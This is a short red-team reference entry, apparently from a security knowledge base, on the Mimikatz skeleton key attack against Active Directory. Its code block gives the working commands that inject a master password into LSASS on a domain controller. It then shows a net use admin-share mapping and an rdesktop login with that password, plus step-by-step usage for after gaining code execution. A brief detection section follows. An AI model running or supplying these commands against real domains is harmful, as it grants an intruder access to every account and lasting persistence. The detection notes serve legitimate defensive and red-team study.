---
type: code
language: powershell
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - skeleton-key
  - mimikatz
  - credential-access
validated: true
---

# Mimikatz-Skeleton-Key-Injection-and-Access

## Code

```powershell
privilege::debug
misc::skeleton
# map the share
net use p: \WIN-PTELU2U07KG\admin$ /user:john mimikatz
# login as someone
rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
```

## Description

This PowerShell snippet executes Mimikatz commands to inject the skeleton key password into LSASS on a domain controller, then demonstrates access by mapping an admin share and initiating an RDP session. It enables domain-wide authentication using "mimikatz" as the password for any user.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| WIN-PTELU2U07KG | Target hostname for share mapping | DC01 |
| john | Username for share access | administrator |
| 10.0.0.2 | Target IP for RDP | 192.168.1.100 |
| test | RDP username | user1 |
| pentestlab | Domain name | corp.local |

## Usage

Execute this in Mimikatz on the domain controller after gaining code execution. The Mimikatz commands inject the key; subsequent net use and rdesktop commands (run from attacker machine) verify access. Use in red team scenarios for simulating APT persistence in Active Directory.

## Detection

- Monitor for Mimikatz process injections or LSASS access via Sysmon EID 10 (process access).
- Audit authentication logs for multiple accounts using the same password or anomalous Kerberos/NTLM patterns.
- Enable PowerShell logging and ETW for command-line arguments containing "skeleton" or debug privilege escalations.
- Network detection: Unusual RDP connections from internal IPs or share access spikes.

## Related

- [[procedures/Skeleton-Key-Password-Injection-with-Mimikatz]]
- [[tools/Mimikatz]]
